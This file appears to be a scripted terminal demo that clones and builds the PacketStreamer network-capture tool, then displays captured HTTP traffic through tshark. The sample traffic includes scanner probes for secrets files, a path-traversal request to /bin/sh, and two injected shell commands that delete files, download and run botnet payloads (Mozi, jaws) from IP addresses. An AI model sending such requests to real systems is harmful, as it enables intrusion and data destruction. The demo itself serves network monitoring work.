@@ -1,0 +1,96 @@
+# packetstreamer script
+
+writedelayshort 0.01
+writedelaylong  0.1
+typedelay 0.1
+
+prompt src
+type git clone 
+pause 0.2
+type https://github.com/deepfence/PacketStreamer.git
+pause 0.2
+type \r\n
+
+pause 0.2
+write Cloning into 'PacketStreamer'...\r\n
+pause 0.5
+write remote: Enumerating objects: 559, done.\r\nremote: Counting objects:   0% (1/111)\rremote: Counting objects:   1% (2/111)\rremote: Counting objects:   2% (3/111)\rremote: Counting objects:   3% (4/111)\rremote: Counting objects:   4% (5/111)\rremote: Counting objects:  10% (12/111)\rremote: Counting objects:  11% (13/111)\rremote: Counting objects:  16% (18/111)\rremote: Counting objects:  17% (19/111)\rremote: Counting objects:  18% (20/111)\rremote: Counting objects:  19% (22/111)\rremote: Counting objects:  36% (40/111)\rremote: Counting objects:  37% (42/111)\rremote: Counting objects:  38% (43/111)\rremote: Counting objects:  39% (44/111)\rremote: Counting objects:  84% (94/111)\rremote: Counting objects:  97% (108/111)\rremote: Counting objects:  98% (109/111)\rremote: Counting objects:  99% (110/111)\rremote: Counting objects: 100% (111/111)\rremote: Counting objects: 100% (111/111), done.\r\n
+
+write remote: Compressing objects:   1% (1/71)\rremote: Compressing objects:   2% (2/71)\rremote: Compressing objects:   4% (3/71)\rremote: Compressing objects:   5% (4/71)\rremote: Compressing objects:   7% (5/71)\rremote: Compressing objects:   8% (6/71)\rremote: Compressing objects:   9% (7/71)\rremote: Compressing objects:  11% (8/71)\rremote: Compressing objects:  29% (21/71)\rremote: Compressing objects:  30% (22/71)\rremote: Compressing objects:  32% (23/71)\rremote: Compressing objects:  33% (24/71)\rremote: Compressing objects:  57% (41/71)\rremote: Compressing objects:  59% (42/71)\rremote: Compressing objects:  60% (43/71)\rremote: Compressing objects:  61% (44/71)\rremote: Compressing objects:  63% (45/71)\rremote: Compressing objects:  64% (46/71)\rremote: Compressing objects:  66% (47/71)\rremote: Compressing objects:  67% (48/71)\rremote: Compressing objects:  97% (69/71)\rremote: Compressing objects:  98% (70/71)\rremote: Compressing objects: 100% (71/71)\rremote: Compressing objects: 100% (71/71), done.\r\n
+
+write Receiving objects:   0% (1/559)\rReceiving objects:   1% (6/559)\rReceiving objects:   2% (12/559)\rReceiving objects:   3% (17/559)\rReceiving objects:   4% (23/559)\rReceiving objects:   5% (28/559)\rReceiving objects:   6% (34/559)\rReceiving objects:   7% (40/559)\rReceiving objects:   8% (45/559)\rReceiving objects:   9% (51/559)\rReceiving objects:  40% (224/559)\rReceiving objects:  41% (230/559)\rReceiving objects:  42% (235/559)\rReceiving objects:  43% (241/559)\rReceiving objects:  44% (246/559)\rReceiving objects:  50% (280/559)\rReceiving objects:  51% (286/559), 572.00 KiB | 1.01 MiB/s\rReceiving objects:  52% (291/559), 572.00 KiB | 1.01 MiB/s\rReceiving objects:  53% (297/559), 572.00 KiB | 1.01 MiB/s\rReceiving objects:  65% (364/559), 572.00 KiB | 1.01 MiB/s\rReceiving objects:  73% (409/559), 1.43 MiB | 1.29 MiB/s\rReceiving objects:  77% (431/559), 1.43 MiB | 1.29 MiB/s\rReceiving objects:  78% (437/559), 1.43 MiB | 1.29 MiB/s\rReceiving objects:  79% (442/559), 1.43 MiB | 1.29 MiB/s\rReceiving objects:  83% (464/559), 1.43 MiB | 1.29 MiB/s\rReceiving objects:  84% (470/559), 1.43 MiB | 1.29 MiB/s\rReceiving objects:  85% (476/559), 1.43 MiB | 1.29 MiB/s\rReceiving objects:  89% (498/559), 1.43 MiB | 1.29 MiB/s\rremote: Total 559 (delta 55), reused 42 (delta 40), pack-reused 448\r\nReceiving objects:  90% (504/559), 1.43 MiB | 1.29 MiB/s\rReceiving objects:  97% (543/559), 1.43 MiB | 1.29 MiB/s\rReceiving objects:  98% (548/559), 1.43 MiB | 1.29 MiB/s\rReceiving objects:  99% (554/559), 1.43 MiB | 1.29 MiB/s\rReceiving objects: 100% (559/559), 1.43 MiB | 1.29 MiB/s\rReceiving objects: 100% (559/559), 1.89 MiB | 1.47 MiB/s, done.\r\n
+
+write Resolving deltas:   0% (0/232)\rResolving deltas:   1% (3/232)\rResolving deltas:   2% (5/232)\rResolving deltas:   6% (16/232)\rResolving deltas:   7% (18/232)\rResolving deltas:  23% (55/232)\rResolving deltas:  26% (62/232)\rResolving deltas:  28% (67/232)\rResolving deltas:  31% (73/232)\rResolving deltas:  32% (75/232)\rResolving deltas:  54% (126/232)\rResolving deltas:  55% (129/232)\rResolving deltas:  56% (131/232)\rResolving deltas:  57% (133/232)\rResolving deltas:  58% (136/232)\rResolving deltas:  73% (170/232)\rResolving deltas:  74% (173/232)\rResolving deltas:  81% (188/232)\rResolving deltas:  82% (191/232)\rResolving deltas:  83% (194/232)\rResolving deltas:  95% (221/232)\rResolving deltas:  96% (224/232)\rResolving deltas: 100% (232/232)\rResolving deltas: 100% (232/232), done.\r\n
+
+pause 0.2
+write \r\n
+
+prompt
+
+pause 2
+
+type cd PacketStreamer/
+pause 0.2
+type \r\n
+
+
+prompt PacketStreamer
+pause 1.5
+
+type make
+pause 0.2
+type \r\n
+pause 0.2
+
+write go build -tags '' --ldflags '' -o packetstreamer ./main.go\r\n
+pause 2
+write \r\n
+
+prompt
+pause 1
+
+typefast ./packetstreamer receiver \\\r\n
+pause 0.2
+typefast    --config contrib/config/receiver-stdout.yaml | \\\r\n
+pause 0.2
+typefast    tshark -r - -Y http.request.line \\\r\n    
+pause 0.2
+typefast    -o 'gui.column.format:\"Proto\",\"%p\",\"Length\",\"%L\",\"Info\",\"%i\"'
+pause 0.2
+type \r\n\r\n
+
+pause 1
+
+write 2022/08/18 14:57:21 Start receiving\r\n
+write 2022/08/18 14:57:21 Now waiting in main\r\n
+
+pause 3
+
+write 2022/08/18 14:57:24 Accepted connection on socket:  tcp 127.0.0.1:15310\r\n
+write \r\n
+
+pause 2
+
+writedelaylong 0.5
+writedelayshort 0.5
+
+write HTTP 295 GET /.env HTTP/1.1
+write \r\nHTTP 86 POST /.aws/credentials HTTP/1.1
+write \r\nHTTP 599 POST /boaform/admin/formLogin HTTP/1.1
+write \r\nHTTP 335 GET /_ignition/execute-solution HTTP/1.1
+write \r\nHTTP 292 GET //robots.txt HTTP/1.1
+write \r\nHTTP 306 GET //.well-known/security.txt HTTP/1.1
+write \r\nHTTP 293 GET //sitemap.xml HTTP/1.1
+write \r\nHTTP 176 GET http://example.com/ HTTP/1.1
+write \r\nHTTP 796 GET /Rh-aD.nSuH_ HTTP/1.1
+write \r\nHTTP 416 POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1
+write \r\nHTTP 86 POST /assets/images/get.php HTTP/1.1
+write \r\nHTTP 573 GET /dup-installer/main.installer.php HTTP/1.1
+write \r\nHTTP 296 GET /shell?cd+/tmp;rm+-rf+*;wget+23.45.67.89/jaws;sh+/tmp/jaws HTTP/1.1
+write \r\nHTTP 302 GET /actuator/gateway/routes HTTP/1.1
+write \r\nHTTP 336 GET /shell?cd+/tmp;rm+-rf+*;wget+http://12.34.56.78:3141Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1
+
+pause 1
+
+write \r\n^C\r\n
+prompt
